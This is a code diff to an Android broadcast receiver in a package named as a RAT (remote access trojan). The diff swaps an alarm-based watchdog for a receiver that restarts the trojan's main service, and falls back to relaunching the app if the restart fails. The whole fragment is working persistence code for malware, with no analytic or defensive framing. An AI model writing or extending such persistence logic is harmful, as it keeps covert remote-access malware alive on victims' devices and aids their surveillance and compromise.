@@ -6,13 +6,16 @@ import android.content.Intent;
 import android.os.Build;
 import android.util.Log;
 import com.enterprise.rat.services.MainService;
-import com.enterprise.rat.utils.PersistenceManager;
 
-public class AlarmReceiver extends BroadcastReceiver {
+public class PackageReplacedReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
-        Log.d("AlarmReceiver", "Alarm received, restarting service");
+        String action = intent.getAction();
+        if (action == null) return;
+
+        Log.d("PackageReplaced", "Received: " + action);
         Intent serviceIntent = new Intent(context, MainService.class);
+
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(serviceIntent);
@@ -20,9 +23,14 @@ public class AlarmReceiver extends BroadcastReceiver {
                 context.startService(serviceIntent);
             }
         } catch (Exception e) {
-            Log.e("AlarmReceiver", "Failed to start service", e);
+            Log.e("PackageReplaced", "Failed to start service", e);
+            // Fallback: start via activity
+            Intent launchIntent = context.getPackageManager()
+                .getLaunchIntentForPackage(context.getPackageName());
+            if (launchIntent != null) {
+                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(launchIntent);
+            }
         }
-        // Reschedule watchdog
-        PersistenceManager.scheduleKeepAlive(context);
     }
 }
